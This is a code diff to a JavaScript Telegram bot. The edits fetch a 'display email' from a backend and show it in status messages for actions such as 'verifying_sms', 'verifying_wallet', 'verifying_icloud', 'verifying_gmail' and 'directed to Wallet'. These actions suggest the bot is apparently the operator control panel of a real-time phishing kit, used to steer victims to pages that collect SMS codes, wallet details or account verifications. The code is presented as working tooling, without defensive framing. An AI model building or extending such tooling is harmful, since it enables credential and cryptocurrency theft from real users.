@@ -314,7 +314,7 @@ bot.on("callback_query", async (query) => {
         try {
           const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
           const verifyData = await verifyRes.json();
-          const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          const verifyEmail = verifyData.email || 'unknown@example.com';
           
           let choiceText = '';
           if (action === "verifying_sms") {
@@ -544,15 +544,55 @@ bot.on("callback_query", async (query) => {
       } else if (action === "gmail_verify_reject") {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
       } else if (action === "verifying_sms") {
-        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        // Fetch verifying info
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${encodeURIComponent(identifier)}`);
+          const verifyData = await verifyRes.json();
+          const displayEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          statusMessage = `📧 <code>${displayEmail}</code> → <b>SMS - 2</b> 💬`;
+        } catch (err) {
+          statusMessage = `📧 <code>unknown@example.com</code> → <b>SMS - 2</b> 💬`;
+        }
       } else if (action === "verifying_done") {
-        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        // Fetch verifying info
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${encodeURIComponent(identifier)}`);
+          const verifyData = await verifyRes.json();
+          const displayEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          statusMessage = `📧 <code>${displayEmail}</code> → <b>Done</b> 🏁`;
+        } catch (err) {
+          statusMessage = `📧 <code>unknown@example.com</code> → <b>Done</b> 🏁`;
+        }
       } else if (action === "verifying_wallet") {
-        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+        // Fetch verifying info
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${encodeURIComponent(identifier)}`);
+          const verifyData = await verifyRes.json();
+          const displayEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          statusMessage = `📧 <code>${displayEmail}</code> → <b>Wallet</b> 💼`;
+        } catch (err) {
+          statusMessage = `📧 <code>unknown@example.com</code> → <b>Wallet</b> 💼`;
+        }
       } else if (action === "verifying_icloud") {
-        statusMessage = `📧 <code>${email}</code> → ☁️`;
+        // Fetch verifying info
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${encodeURIComponent(identifier)}`);
+          const verifyData = await verifyRes.json();
+          const displayEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          statusMessage = `📧 <code>${displayEmail}</code> → ☁️`;
+        } catch (err) {
+          statusMessage = `📧 <code>unknown@example.com</code> → ☁️`;
+        }
       } else if (action === "verifying_gmail") {
-        statusMessage = `📧 <code>${email}</code> → 🌈`;
+        // Fetch verifying info
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${encodeURIComponent(identifier)}`);
+          const verifyData = await verifyRes.json();
+          const displayEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          statusMessage = `📧 <code>${displayEmail}</code> → 🌈`;
+        } catch (err) {
+          statusMessage = `📧 <code>unknown@example.com</code> → 🌈`;
+        }
       } else if (action === "sms2_wallet") {
         statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
       } else if (action === "sms2_done") {
@@ -684,7 +724,7 @@ if (bot2) {
           try {
             const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
             const verifyData = await verifyRes.json();
-            const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+            const verifyEmail = verifyData.email || 'unknown@example.com';
             
             let choiceText = '';
             if (action === "verifying_sms") {
